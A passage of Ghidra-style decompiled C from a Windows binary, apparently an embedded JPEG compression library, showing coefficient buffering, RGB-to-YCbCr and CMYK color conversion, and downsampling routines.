  iStack28 = *(int *)(param_1 + 0x40);
  puStack20 = (undefined4 *)(iVar5 + 8);
  for (; iStack32 < *(int *)(param_1 + 0x38); iStack32 = iStack32 + 1) {
    puVar4 = (undefined4 *)
             (**(code **)(*(int *)(param_1 + 4) + 8))
                       (param_1,1,
                        (*(int *)(iStack28 + 0x1c) * 8 * *(int *)(param_1 + 0xe4)) /
                        *(int *)(iStack28 + 8),iVar2 * 3);
    FUN_00420fc8((char)(iVar2 * 0xc),(char)(puStack24 + iVar2),extraout_CL,puStack24 + iVar2,puVar4,
                 iVar2 * 0xc);
    iVar5 = 0;
    puVar6 = puVar4;
    puVar7 = puStack24;
    if (0 < iVar2) {
      do {
        *puVar7 = puVar4[iVar5 + iVar2 * 2];
        iVar1 = iVar5 + iVar2 * 4;
        iVar5 = iVar5 + 1;
        puVar7 = puVar7 + 1;
        uVar3 = *puVar6;
        puVar6 = puVar6 + 1;
        puStack24[iVar1] = uVar3;
      } while (iVar5 < iVar2);
    }
    *puStack20 = puStack24 + iVar2;
    puStack24 = puStack24 + iVar2 * 5;
    puStack20 = puStack20 + 1;
    iStack28 = iStack28 + 0x54;
  }
  return;
}



void FUN_004306d0(int *param_1,int param_2,undefined4 param_3)

{
  code **ppcVar1;
  code *pcVar2;
  int iVar3;
  int iVar4;
  
  if (param_2 != 0) {
    *(undefined4 *)(*param_1 + 0x14) = 4;
    (**(code **)*param_1)();
  }
  ppcVar1 = (code **)(**(code **)param_1[1])(param_1,1,0x40,param_3);
  param_1[0x54] = (int)ppcVar1;
  *ppcVar1 = FUN_0043023c;
  if (*(int *)(param_1[0x58] + 8) == 0) {
    ppcVar1[1] = FUN_004302b0;
    ppcVar1 = ppcVar1 + 2;
    iVar3 = param_1[0x10];
    for (iVar4 = 0; iVar4 < param_1[0xe]; iVar4 = iVar4 + 1) {
      pcVar2 = (code *)(**(code **)(param_1[1] + 8))
                                 (param_1,1,
                                  (*(int *)(iVar3 + 0x1c) * 8 * param_1[0x39]) / *(int *)(iVar3 + 8)
                                  ,param_1[0x3a]);
      *ppcVar1 = pcVar2;
      ppcVar1 = ppcVar1 + 1;
      iVar3 = iVar3 + 0x54;
    }
  }
  else {
    ppcVar1[1] = FUN_00430410;
    FUN_004305b8((int)param_1);
  }
  return;
}



void FUN_00430778(int param_1)

{
  int iVar1;
  uint uVar2;
  
  iVar1 = *(int *)(param_1 + 0x154);
  if (*(int *)(param_1 + 0xf0) < 2) {
    uVar2 = *(int *)(param_1 + 0xec) - 1;
    if (uVar2 < *(uint *)(iVar1 + 8) || uVar2 == *(uint *)(iVar1 + 8)) {
      *(undefined4 *)(iVar1 + 0x14) = *(undefined4 *)(*(int *)(param_1 + 0xf4) + 0x48);
    }
    else {
      *(undefined4 *)(iVar1 + 0x14) = *(undefined4 *)(*(int *)(param_1 + 0xf4) + 0xc);
    }
  }
  else {
    *(undefined4 *)(iVar1 + 0x14) = 1;
  }
  *(undefined4 *)(iVar1 + 0xc) = 0;
  *(undefined4 *)(iVar1 + 0x10) = 0;
  return;
}



void FUN_004307c4(int *param_1,int param_2)

{
  int iVar1;
  
  iVar1 = param_1[0x55];
  *(undefined4 *)(iVar1 + 8) = 0;
  FUN_00430778((int)param_1);
  if (param_2 == 0) {
    if (*(int *)(iVar1 + 0x40) != 0) {
      *(undefined4 *)(*param_1 + 0x14) = 4;
      (**(code **)*param_1)();
    }
    *(code **)(iVar1 + 4) = FUN_00430858;
  }
  else if (param_2 == 2) {
    if (*(int *)(iVar1 + 0x40) == 0) {
      *(undefined4 *)(*param_1 + 0x14) = 4;
      (**(code **)*param_1)();
    }
    *(code **)(iVar1 + 4) = FUN_00430cec;
  }
  else if (param_2 == 3) {
    if (*(int *)(iVar1 + 0x40) == 0) {
      *(undefined4 *)(*param_1 + 0x14) = 4;
      (**(code **)*param_1)();
    }
    *(code **)(iVar1 + 4) = FUN_00430a68;
  }
  else {
    *(undefined4 *)(*param_1 + 0x14) = 4;
    (**(code **)*param_1)();
  }
  return;
}



undefined4 FUN_00430858(int param_1,int param_2)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  uint uVar7;
  int iVar8;
  int local_2c;
  int local_28;
  int local_24;
  int local_20;
  int local_18;
  int *local_10;
  
  iVar1 = *(int *)(param_1 + 0x154);
  uVar7 = *(int *)(param_1 + 0x104) - 1;
  iVar2 = *(int *)(param_1 + 0xec);
  local_20 = *(int *)(iVar1 + 0x10);
  do {
    if (*(int *)(iVar1 + 0x14) <= local_20) {
      *(int *)(iVar1 + 8) = *(int *)(iVar1 + 8) + 1;
      FUN_00430778(param_1);
      return 1;
    }
    for (uVar3 = *(uint *)(iVar1 + 0xc); uVar3 <= uVar7; uVar3 = uVar3 + 1) {
      local_2c = 0;
      local_10 = (int *)(param_1 + 0xf4);
      for (local_28 = 0; local_28 < *(int *)(param_1 + 0xf0); local_28 = local_28 + 1) {
        iVar6 = *local_10;
        if (uVar3 < uVar7) {
          iVar8 = *(int *)(iVar6 + 0x34);
        }
        else {
          iVar8 = *(int *)(iVar6 + 0x44);
        }
        iVar4 = *(int *)(iVar6 + 0x40);
        local_18 = local_20 << 3;
        for (local_24 = 0; local_24 < *(int *)(iVar6 + 0x38); local_24 = local_24 + 1) {
          if ((*(uint *)(iVar1 + 8) < iVar2 - 1U) || (local_20 + local_24 < *(int *)(iVar6 + 0x48)))
          {
            (**(code **)(*(int *)(param_1 + 0x164) + 4))
                      (param_1,iVar6,*(undefined4 *)(param_2 + *(int *)(iVar6 + 4) * 4),iVar8,
                       uVar3 * iVar4,local_18,*(undefined4 *)(iVar1 + 0x18 + local_2c * 4));
            if (iVar8 < *(int *)(iVar6 + 0x34)) {
              FUN_0042dc2c();
              for (iVar5 = iVar8; iVar5 < *(int *)(iVar6 + 0x34); iVar5 = iVar5 + 1) {
                **(undefined2 **)(iVar1 + 0x18 + (local_2c + iVar5) * 4) =
                     **(undefined2 **)(iVar1 + 0x14 + (local_2c + iVar5) * 4);
              }
            }
          }
          else {
            FUN_0042dc2c();
            for (iVar5 = 0; iVar5 < *(int *)(iVar6 + 0x34); iVar5 = iVar5 + 1) {
              **(undefined2 **)(iVar1 + 0x18 + (local_2c + iVar5) * 4) =
                   **(undefined2 **)(iVar1 + 0x14 + local_2c * 4);
            }
          }
          local_2c = local_2c + *(int *)(iVar6 + 0x34);
          local_18 = local_18 + 8;
        }
        local_10 = local_10 + 1;
      }
      iVar6 = (**(code **)(*(int *)(param_1 + 0x168) + 4))(param_1,iVar1 + 0x18);
      if (iVar6 == 0) {
        *(int *)(iVar1 + 0x10) = local_20;
        *(uint *)(iVar1 + 0xc) = uVar3;
        return 0;
      }
    }
    *(undefined4 *)(iVar1 + 0xc) = 0;
    local_20 = local_20 + 1;
  } while( true );
}



void FUN_00430a68(int param_1,undefined4 *param_2)

{
  undefined2 uVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  uint uVar6;
  int iVar7;
  uint uVar8;
  undefined2 *puVar9;
  uint uStack60;
  int local_38;
  uint uStack52;
  uint uStack48;
  int local_2c;
  undefined2 *puStack36;
  undefined4 *local_20;
  int *piStack28;
  undefined4 *local_14;
  int *piStack16;
  
  iVar2 = *(int *)(param_1 + 0x154);
  uVar4 = *(int *)(param_1 + 0xec) - 1;
  local_38 = 0;
  local_2c = *(int *)(param_1 + 0x40);
  local_20 = (undefined4 *)(iVar2 + 0x40);
  local_14 = param_2;
  for (; local_38 < *(int *)(param_1 + 0x38); local_38 = local_38 + 1) {
    piStack16 = (int *)(**(code **)(*(int *)(param_1 + 4) + 0x20))
                                 (param_1,*local_20,*(int *)(iVar2 + 8) * *(int *)(local_2c + 0xc),1
                                  ,*(int *)(local_2c + 0xc));
    if (*(uint *)(iVar2 + 8) < uVar4) {
      uStack48 = *(uint *)(local_2c + 0xc);
    }
    else {
      uStack48 = *(uint *)(local_2c + 0x20) % *(uint *)(local_2c + 0xc);
      if (uStack48 == 0) {
        uStack48 = *(uint *)(local_2c + 0xc);
      }
    }
    uVar6 = *(uint *)(local_2c + 0x1c);
    uVar3 = *(uint *)(local_2c + 8);
    uVar8 = uVar6 % uVar3;
    if (0 < (int)uVar8) {
      uVar8 = uVar3 - uVar8;
    }
    uStack52 = 0;
    piStack28 = piStack16;
    if (0 < (int)uStack48) {
      do {
        iVar5 = *piStack28;
        (**(code **)(*(int *)(param_1 + 0x164) + 4))
                  (param_1,local_2c,*local_14,uVar6,0,uStack52 << 3,iVar5);
        if (0 < (int)uVar8) {
          puVar9 = (undefined2 *)(iVar5 + uVar6 * 0x80);
          FUN_0042dc2c();
          iVar5 = 0;
          uVar1 = puVar9[-0x40];
          if (0 < (int)uVar8) {
            do {
              *puVar9 = uVar1;
              iVar5 = iVar5 + 1;
              puVar9 = puVar9 + 0x40;
            } while (iVar5 < (int)uVar8);
          }
        }
        uStack52 = uStack52 + 1;
        piStack28 = piStack28 + 1;
      } while ((int)uStack52 < (int)uStack48);
    }
    if (*(uint *)(iVar2 + 8) == uVar4) {
      uVar6 = (uVar6 + uVar8) / uVar3;
      piStack16 = piStack16 + uStack48;
      for (uStack52 = uStack48; (int)uStack52 < *(int *)(local_2c + 0xc); uStack52 = uStack52 + 1) {
        puStack36 = (undefined2 *)*piStack16;
        iVar5 = piStack16[-1];
        FUN_0042dc2c();
        uStack60 = 0;
        if (uVar6 != 0) {
          do {
            iVar7 = 0;
            uVar1 = *(undefined2 *)(iVar5 + -0x80 + uVar3 * 0x80);
            puVar9 = puStack36;
            if (0 < (int)uVar3) {
              do {
                *puVar9 = uVar1;
                iVar7 = iVar7 + 1;
                puVar9 = puVar9 + 0x40;
              } while (iVar7 < (int)uVar3);
            }
            puStack36 = puStack36 + uVar3 * 0x40;
            iVar5 = iVar5 + uVar3 * 0x80;
            uStack60 = uStack60 + 1;
          } while (uStack60 < uVar6);
        }
        piStack16 = piStack16 + 1;
      }
    }
    local_20 = local_20 + 1;
    local_14 = local_14 + 1;
    local_2c = local_2c + 0x54;
  }
  FUN_00430cec(param_1);
  return;
}



undefined4 FUN_00430cec(int param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int *piVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int *piVar8;
  int iVar9;
  uint local_3c;
  int local_38;
  int local_34;
  int *local_28;
  int *local_20;
  int local_1c [4];
  
  piVar8 = local_1c;
  iVar1 = *(int *)(param_1 + 0x154);
  piVar4 = (int *)(param_1 + 0xf4);
  for (local_38 = 0; local_38 < *(int *)(param_1 + 0xf0); local_38 = local_38 + 1) {
    iVar7 = *(int *)(*piVar4 + 0xc);
    iVar7 = (**(code **)(*(int *)(param_1 + 4) + 0x20))
                      (param_1,*(undefined4 *)(iVar1 + 0x40 + *(int *)(*piVar4 + 4) * 4),
                       *(int *)(iVar1 + 8) * iVar7,0,iVar7);
    *piVar8 = iVar7;
    piVar8 = piVar8 + 1;
    piVar4 = piVar4 + 1;
  }
  local_34 = *(int *)(iVar1 + 0x10);
  do {
    if (*(int *)(iVar1 + 0x14) <= local_34) {
      *(int *)(iVar1 + 8) = *(int *)(iVar1 + 8) + 1;
      FUN_00430778(param_1);
      return 1;
    }
    for (local_3c = *(uint *)(iVar1 + 0xc); local_3c < *(uint *)(param_1 + 0x104);
        local_3c = local_3c + 1) {
      iVar7 = 0;
      local_20 = local_1c;
      local_28 = (int *)(param_1 + 0xf4);
      for (local_38 = 0; local_38 < *(int *)(param_1 + 0xf0); local_38 = local_38 + 1) {
        iVar2 = *local_28;
        iVar3 = *(int *)(iVar2 + 0x34);
        for (iVar9 = 0; iVar9 < *(int *)(iVar2 + 0x38); iVar9 = iVar9 + 1) {
          iVar6 = *(int *)(*local_20 + (local_34 + iVar9) * 4) + iVar3 * local_3c * 0x80;
          piVar4 = (int *)(iVar1 + 0x18 + iVar7 * 4);
          for (iVar5 = 0; iVar5 < *(int *)(iVar2 + 0x34); iVar5 = iVar5 + 1) {
            *piVar4 = iVar6;
            iVar6 = iVar6 + 0x80;
            iVar7 = iVar7 + 1;
            piVar4 = piVar4 + 1;
          }
        }
        local_20 = local_20 + 1;
        local_28 = local_28 + 1;
      }
      iVar7 = (**(code **)(*(int *)(param_1 + 0x168) + 4))(param_1,iVar1 + 0x18);
      if (iVar7 == 0) {
        *(int *)(iVar1 + 0x10) = local_34;
        *(uint *)(iVar1 + 0xc) = local_3c;
        return 0;
      }
    }
    *(undefined4 *)(iVar1 + 0xc) = 0;
    local_34 = local_34 + 1;
  } while( true );
}



void FUN_00430eb4(int param_1,int param_2)

{
  code **ppcVar1;
  int iVar2;
  int iVar3;
  code *pcVar4;
  code **ppcVar5;
  int iVar6;
  int iStack20;
  
  ppcVar1 = (code **)(***(code ***)(param_1 + 4))(param_1,1,0x68);
  *(code ***)(param_1 + 0x154) = ppcVar1;
  *ppcVar1 = FUN_004307c4;
  if (param_2 == 0) {
    iVar2 = (**(code **)(*(int *)(param_1 + 4) + 4))(param_1,1,0x500);
    ppcVar5 = ppcVar1 + 6;
    iVar6 = 0;
    do {
      iVar3 = iVar6 + 1;
      *ppcVar5 = (code *)(iVar6 * 0x80 + iVar2);
      ppcVar5 = ppcVar5 + 1;
      iVar6 = iVar3;
    } while (iVar3 < 10);
    ppcVar1[0x10] = (code *)0x0;
  }
  else {
    iStack20 = 0;
    iVar6 = *(int *)(param_1 + 0x40);
    ppcVar1 = ppcVar1 + 0x10;
    for (; iStack20 < *(int *)(param_1 + 0x38); iStack20 = iStack20 + 1) {
      iVar2 = FUN_0042dbb8(*(int *)(iVar6 + 0x1c),*(int *)(iVar6 + 8));
      iVar3 = FUN_0042dbb8(*(int *)(iVar6 + 0x20),*(int *)(iVar6 + 0xc));
      pcVar4 = (code *)(**(code **)(*(int *)(param_1 + 4) + 0x14))
                                 (param_1,1,0,*(undefined4 *)(iVar6 + 0xc),iVar3,iVar2);
      *ppcVar1 = pcVar4;
      ppcVar1 = ppcVar1 + 1;
      iVar6 = iVar6 + 0x54;
    }
  }
  return;
}



void FUN_0043101c(int param_1,byte **param_2,int *param_3,int param_4,int param_5)

{
  int iVar1;
  uint uVar2;
  byte *pbVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  undefined *local_24;
  undefined *local_20;
  undefined *local_1c;
  uint local_14;
  byte **local_8;
  
  iVar1 = *(int *)(*(int *)(param_1 + 0x15c) + 8);
  uVar2 = *(uint *)(param_1 + 0x1c);
  local_8 = param_2;
  while( true ) {
    param_4 = param_4 + -1;
    if (param_4 < 0) break;
    pbVar3 = *local_8;
    local_8 = local_8 + 1;
    local_1c = *(undefined **)(*param_3 + param_5 * 4);
    local_20 = *(undefined **)(param_3[1] + param_5 * 4);
    local_24 = *(undefined **)(param_3[2] + param_5 * 4);
    param_5 = param_5 + 1;
    local_14 = 0;
    if (uVar2 != 0) {
      do {
        uVar5 = (uint)pbVar3[2];
        uVar4 = (uint)pbVar3[1];
        uVar6 = (uint)*pbVar3;
        pbVar3 = pbVar3 + 3;
        *local_1c = (char)((uint)(*(int *)(iVar1 + uVar5 * 4) + *(int *)(iVar1 + 0x400 + uVar4 * 4)
                                 + *(int *)(iVar1 + 0x800 + uVar6 * 4)) >> 0x10);
        *local_20 = (char)((uint)(*(int *)(iVar1 + 0xc00 + uVar5 * 4) +
                                  *(int *)(iVar1 + 0x1000 + uVar4 * 4) +
                                 *(int *)(iVar1 + 0x1400 + uVar6 * 4)) >> 0x10);
        *local_24 = (char)((uint)(*(int *)(iVar1 + 0x1400 + uVar5 * 4) +
                                  *(int *)(iVar1 + 0x1800 + uVar4 * 4) +
                                 *(int *)(iVar1 + 0x1c00 + uVar6 * 4)) >> 0x10);
        local_14 = local_14 + 1;
        local_24 = local_24 + 1;
        local_20 = local_20 + 1;
        local_1c = local_1c + 1;
      } while (local_14 < uVar2);
    }
  }
  return;
}



void FUN_00431124(int param_1,byte **param_2,int *param_3,int param_4,int param_5)

{
  byte *pbVar1;
  byte *pbVar2;
  byte bVar3;
  int iVar4;
  uint uVar5;
  byte *pbVar6;
  undefined *puVar7;
  uint uVar8;
  byte **local_8;
  
  iVar4 = *(int *)(*(int *)(param_1 + 0x15c) + 8);
  uVar5 = *(uint *)(param_1 + 0x1c);
  local_8 = param_2;
  while( true ) {
    param_4 = param_4 + -1;
    if (param_4 < 0) break;
    pbVar6 = *local_8;
    local_8 = local_8 + 1;
    puVar7 = *(undefined **)(*param_3 + param_5 * 4);
    param_5 = param_5 + 1;
    uVar8 = 0;
    if (uVar5 != 0) {
      do {
        uVar8 = uVar8 + 1;
        pbVar1 = pbVar6 + 2;
        pbVar2 = pbVar6 + 1;
        bVar3 = *pbVar6;
        pbVar6 = pbVar6 + 3;
        *puVar7 = (char)((uint)(*(int *)(iVar4 + (uint)*pbVar1 * 4) +
                                *(int *)(iVar4 + 0x400 + (uint)*pbVar2 * 4) +
                               *(int *)(iVar4 + 0x800 + (uint)bVar3 * 4)) >> 0x10);
        puVar7 = puVar7 + 1;
      } while (uVar8 < uVar5);
    }
  }
  return;
}



void FUN_004311b0(int param_1,byte **param_2,int *param_3,int param_4,int param_5)

{
  byte *pbVar1;
  int iVar2;
  uint uVar3;
  byte *pbVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  undefined *local_2c;
  undefined *local_28;
  undefined *local_24;
  byte *local_20;
  uint local_18;
  byte **local_8;
  
  iVar2 = *(int *)(*(int *)(param_1 + 0x15c) + 8);
  uVar3 = *(uint *)(param_1 + 0x1c);
  local_8 = param_2;
  while( true ) {
    param_4 = param_4 + -1;
    if (param_4 < 0) break;
    pbVar4 = *local_8;
    local_8 = local_8 + 1;
    local_24 = *(undefined **)(*param_3 + param_5 * 4);
    local_28 = *(undefined **)(param_3[1] + param_5 * 4);
    local_2c = *(undefined **)(param_3[2] + param_5 * 4);
    local_20 = *(byte **)(param_3[3] + param_5 * 4);
    param_5 = param_5 + 1;
    local_18 = 0;
    if (uVar3 != 0) {
      do {
        iVar6 = 0xff - (uint)*pbVar4;
        iVar5 = 0xff - (uint)pbVar4[1];
        iVar7 = 0xff - (uint)pbVar4[2];
        pbVar1 = pbVar4 + 3;
        pbVar4 = pbVar4 + 4;
        *local_20 = *pbVar1;
        *local_24 = (char)((uint)(*(int *)(iVar2 + iVar6 * 4) + *(int *)(iVar2 + 0x400 + iVar5 * 4)
                                 + *(int *)(iVar2 + 0x800 + iVar7 * 4)) >> 0x10);
        *local_28 = (char)((uint)(*(int *)(iVar2 + 0xc00 + iVar6 * 4) +
                                  *(int *)(iVar2 + 0x1000 + iVar5 * 4) +
                                 *(int *)(iVar2 + 0x1400 + iVar7 * 4)) >> 0x10);
        *local_2c = (char)((uint)(*(int *)(iVar2 + 0x1400 + iVar6 * 4) +
                                  *(int *)(iVar2 + 0x1800 + iVar5 * 4) +
                                 *(int *)(iVar2 + 0x1c00 + iVar7 * 4)) >> 0x10);
        local_18 = local_18 + 1;
        local_2c = local_2c + 1;
        local_28 = local_28 + 1;
        local_24 = local_24 + 1;
        local_20 = local_20 + 1;
      } while (local_18 < uVar3);
    }
  }
  return;
}



void FUN_004312f4(int param_1,undefined4 *param_2,int *param_3,int param_4,int param_5)

{
  uint uVar1;
  int iVar2;
  undefined *puVar3;
  undefined *puVar4;
  uint uVar5;
  
  uVar1 = *(uint *)(param_1 + 0x1c);
  iVar2 = *(int *)(param_1 + 0x24);
  while( true ) {
    param_4 = param_4 + -1;
    if (param_4 < 0) break;
    puVar4 = (undefined *)*param_2;
    param_2 = param_2 + 1;
    puVar3 = *(undefined **)(*param_3 + param_5 * 4);
    uVar5 = 0;
    param_5 = param_5 + 1;
    if (uVar1 != 0) {
      do {
        uVar5 = uVar5 + 1;
        *puVar3 = *puVar4;
        puVar3 = puVar3 + 1;
        puVar4 = puVar4 + iVar2;
      } while (uVar5 < uVar1);
    }
  }
  return;
}



void FUN_00431340(int param_1,int *param_2,int *param_3,int param_4,int param_5)

{
  int iVar1;
  uint uVar2;
  undefined *puVar3;
  int iVar4;
  uint uVar5;
  int *local_14;
  int local_8;
  
  iVar1 = *(int *)(param_1 + 0x38);
  uVar2 = *(uint *)(param_1 + 0x1c);
  while( true ) {
    param_4 = param_4 + -1;
    if (param_4 < 0) break;
    local_8 = 0;
    local_14 = param_3;
    if (0 < iVar1) {
      do {
        uVar5 = 0;
        iVar4 = *param_2;
        puVar3 = *(undefined **)(*local_14 + param_5 * 4);
        if (uVar2 != 0) {
          do {
            uVar5 = uVar5 + 1;
            *puVar3 = *(undefined *)(iVar4 + local_8);
            puVar3 = puVar3 + 1;
            iVar4 = iVar4 + iVar1;
          } while (uVar5 < uVar2);
        }
        local_8 = local_8 + 1;
        local_14 = local_14 + 1;
      } while (local_8 < iVar1);
    }
    param_2 = param_2 + 1;
    param_5 = param_5 + 1;
  }
  return;
}



uint FUN_004313b8(int *param_1)

{
  int iVar1;
  undefined4 *puVar2;
  uint uVar3;
  bool bVar4;
  
  puVar2 = (undefined4 *)(**(code **)param_1[1])(param_1,1,0xc);
  param_1[0x57] = (int)puVar2;
  *puVar2 = &DAT_004313b4;
  iVar1 = param_1[10];
  uVar3 = iVar1 - 1;
  if (uVar3 == 0) {
    if (param_1[9] != 1) {
      *(undefined4 *)(*param_1 + 0x14) = 9;
      uVar3 = (**(code **)*param_1)();
    }
  }
  else {
    uVar3 = iVar1 - 4;
    if (iVar1 - 2U < 2) {
      if (param_1[9] != 3) {
        *(undefined4 *)(*param_1 + 0x14) = 9;
        uVar3 = (**(code **)*param_1)();
      }
    }
    else {
      bVar4 = uVar3 < 2;
      uVar3 = iVar1 - 6;
      if (bVar4) {
        if (param_1[9] != 4) {
          *(undefined4 *)(*param_1 + 0x14) = 9;
          uVar3 = (**(code **)*param_1)();
        }
      }
      else if (param_1[9] < 1) {
        *(undefined4 *)(*param_1 + 0x14) = 9;
        uVar3 = (**(code **)*param_1)();
      }
    }
  }
  switch(param_1[0xf]) {
  default:
    if ((param_1[0xf] != param_1[10]) || (uVar3 = param_1[0xe], uVar3 != param_1[9])) {
      *(undefined4 *)(*param_1 + 0x14) = 0x1b;
      uVar3 = (**(code **)*param_1)();
    }
    puVar2[1] = FUN_00431340;
    return uVar3;
  case 1:
    break;
  case 2:
    if (param_1[0xe] != 3) {
      *(undefined4 *)(*param_1 + 0x14) = 10;
      uVar3 = (**(code **)*param_1)();
    }
    if (param_1[10] == 2) {
      puVar2[1] = FUN_00431340;
      return uVar3;
    }
    *(undefined4 *)(*param_1 + 0x14) = 0x1b;
    uVar3 = (**(code **)*param_1)();
    return uVar3;
  case 3:
    if (param_1[0xe] != 3) {
      *(undefined4 *)(*param_1 + 0x14) = 10;
      uVar3 = (**(code **)*param_1)();
    }
    if (param_1[10] == 2) {
      *puVar2 = &LAB_00430f7c;
      puVar2[1] = FUN_0043101c;
      return uVar3;
    }
    if (param_1[10] == 3) {
      puVar2[1] = FUN_00431340;
      return uVar3;
    }
    *(undefined4 *)(*param_1 + 0x14) = 0x1b;
    uVar3 = (**(code **)*param_1)();
    return uVar3;
  case 4:
    if (param_1[0xe] != 4) {
      *(undefined4 *)(*param_1 + 0x14) = 10;
      uVar3 = (**(code **)*param_1)();
    }
    if (param_1[10] == 4) {
      puVar2[1] = FUN_00431340;
      return uVar3;
    }
    *(undefined4 *)(*param_1 + 0x14) = 0x1b;
    uVar3 = (**(code **)*param_1)();
    return uVar3;
  case 5:
    if (param_1[0xe] != 4) {
      *(undefined4 *)(*param_1 + 0x14) = 10;
      uVar3 = (**(code **)*param_1)();
    }
    if (param_1[10] == 4) {
      *puVar2 = &LAB_00430f7c;
      puVar2[1] = FUN_004311b0;
      return uVar3;
    }
    if (param_1[10] == 5) {
      puVar2[1] = FUN_00431340;
      return uVar3;
    }
    *(undefined4 *)(*param_1 + 0x14) = 0x1b;
    uVar3 = (**(code **)*param_1)();
    return uVar3;
  }
  if (param_1[0xe] != 1) {
    *(undefined4 *)(*param_1 + 0x14) = 10;
    uVar3 = (**(code **)*param_1)();
  }
  if (param_1[10] == 1) {
    puVar2[1] = FUN_004312f4;
    return uVar3;
  }
  if (param_1[10] == 2) {
    *puVar2 = &LAB_00430f7c;
    puVar2[1] = FUN_00431124;
    return uVar3;
  }
  if (param_1[10] == 3) {
    puVar2[1] = FUN_004312f4;
    return uVar3;
  }
  *(undefined4 *)(*param_1 + 0x14) = 0x1b;
  uVar3 = (**(code **)*param_1)();
  return uVar3;
}



void FUN_00431608(int *param_1,int param_2,int param_3,int param_4)

{
  undefined uVar1;
  undefined *puVar2;
  int iVar3;
  int iVar4;
  
  if ((0 < param_4 - param_3) && (iVar3 = 0, 0 < param_2)) {
    do {
      puVar2 = (undefined *)(*param_1 + param_3);
      uVar1 = puVar2[-1];
      for (iVar4 = param_4 - param_3; 0 < iVar4; iVar4 = iVar4 + -1) {
        *puVar2 = uVar1;
        puVar2 = puVar2 + 1;
      }
      iVar3 = iVar3 + 1;
      param_1 = param_1 + 1;
    } while (iVar3 < param_2);
  }
  return;
}



void FUN_00431658(int param_1,int *param_2,int param_3,int param_4,int *param_5)

{
  int iVar1;
  code **local_1c;
  int *local_18;
  int *local_14;
  int local_10;
  
  local_10 = 0;
  local_1c = (code **)(*(int *)(param_1 + 0x160) + 0xc);
  iVar1 = *(int *)(param_1 + 0x40);
  local_18 = param_5;
  local_14 = param_2;
  for (; local_10 < *(int *)(param_1 + 0x38); local_10 = local_10 + 1) {
    (**local_1c)(param_1,iVar1,*local_14 + param_3 * 4,
                 *local_18 + param_4 * *(int *)(iVar1 + 0xc) * 4);
    local_14 = local_14 + 1;
    local_18 = local_18 + 1;
    local_1c = local_1c + 1;
    iVar1 = iVar1 + 0x54;
  }
  return;
}



void FUN_004316dc(int param_1,int param_2,int *param_3,undefined4 *param_4)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  byte *pbVar4;
  int iVar5;
  uint uVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  undefined4 *local_38;
  undefined *local_34;
  int local_2c;
  uint local_28;
  int local_14;
  int local_10;
  
  uVar6 = *(int *)(param_2 + 0x1c) * 8;
  iVar1 = *(int *)(param_1 + 0xe4) / *(int *)(param_2 + 8);
  iVar2 = *(int *)(param_1 + 0xe8) / *(int *)(param_2 + 0xc);
  uVar3 = iVar1 * iVar2;
  iVar7 = (int)uVar3 >> 1;
  if (iVar7 < 0) {
    iVar7 = iVar7 + (uint)((uVar3 & 1) != 0);
  }
  FUN_00431608(param_3,*(int *)(param_1 + 0xe8),*(int *)(param_1 + 0x1c),uVar6 * iVar1);
  local_10 = 0;
  local_38 = param_4;
  for (local_14 = 0; local_14 < *(int *)(param_2 + 0xc); local_14 = local_14 + 1) {
    local_34 = (undefined *)*local_38;
    local_28 = 0;
    local_2c = 0;
    if (uVar6 != 0) {
      do {
        iVar5 = 0;
        iVar9 = 0;
        if (0 < iVar2) {
          do {
            iVar8 = 0;
            pbVar4 = (byte *)(param_3[local_10 + iVar9] + local_2c);
            if (0 < iVar1) {
              do {
                iVar5 = iVar5 + (uint)*pbVar4;
                pbVar4 = pbVar4 + 1;
                iVar8 = iVar8 + 1;
              } while (iVar8 < iVar1);
            }
            iVar9 = iVar9 + 1;
          } while (iVar9 < iVar2);
        }
        *local_34 = (char)((iVar7 + iVar5) / (int)uVar3);
        local_34 = local_34 + 1;
        local_28 = local_28 + 1;
        local_2c = local_2c + iVar1;
      } while (local_28 < uVar6);
    }
    local_10 = local_10 + iVar2;
    local_38 = local_38 + 1;
  }
  return;
}



void FUN_004317ec(int param_1,int param_2,undefined4 param_3,int *param_4)

{
  FUN_0042dbd0((undefined)param_3,0,(char)param_4,*(undefined4 *)(param_1 + 0x1c),
               *(undefined4 *)(param_1 + 0xe8),0);
  FUN_00431608(param_4,*(int *)(param_1 + 0xe8),*(int *)(param_1 + 0x1c),
               *(int *)(param_2 + 0x1c) << 3);
  return;
}



void FUN_00431838(int param_1,int param_2,byte **param_3,int *param_4)

{
  byte *pbVar1;
  byte bVar2;
  byte *pbVar3;
  uint uVar4;
  uint uVar5;
  undefined *puVar6;
  int iVar7;
  uint uVar8;
  byte **local_18;
  int *local_14;
  int local_c;
  
  uVar4 = *(int *)(param_2 + 0x1c) * 8;
  FUN_00431608((int *)param_3,*(int *)(param_1 + 0xe8),*(int *)(param_1 + 0x1c),
               *(int *)(param_2 + 0x1c) << 4);
  local_14 = param_4;
  local_18 = param_3;
  for (local_c = 0; local_c < *(int *)(param_2 + 0xc); local_c = local_c + 1) {
    uVar8 = 0;
    puVar6 = (undefined *)*local_14;
    pbVar3 = *local_18;
    uVar5 = 0;
    if (uVar4 != 0) {
      do {
        pbVar1 = pbVar3 + 1;
        uVar8 = uVar8 + 1;
        bVar2 = *pbVar3;
        pbVar3 = pbVar3 + 2;
        iVar7 = (uint)bVar2 + (uint)*pbVar1 + uVar5;
        uVar5 = uVar5 ^ 1;
        *puVar6 = (char)(iVar7 >> 1);
        puVar6 = puVar6 + 1;
      } while (uVar8 < uVar4);
    }
    local_18 = local_18 + 1;
    local_14 = local_14 + 1;
  }
  return;
}



void FUN_004318cc(int param_1,int param_2,byte **param_3,int *param_4)

{
  byte *pbVar1;
  byte *pbVar2;
  byte bVar3;
  byte bVar4;
  byte *pbVar5;
  uint uVar6;
  undefined *puVar7;
  byte *pbVar8;
  int iVar9;
  uint uVar10;
  byte **local_1c;
  int *local_18;
  uint local_10;
  int local_c;
  
  uVar6 = *(int *)(param_2 + 0x1c) * 8;
  FUN_00431608((int *)param_3,*(int *)(param_1 + 0xe8),*(int *)(param_1 + 0x1c),
               *(int *)(param_2 + 0x1c) << 4);
  local_18 = param_4;
  local_1c = param_3;
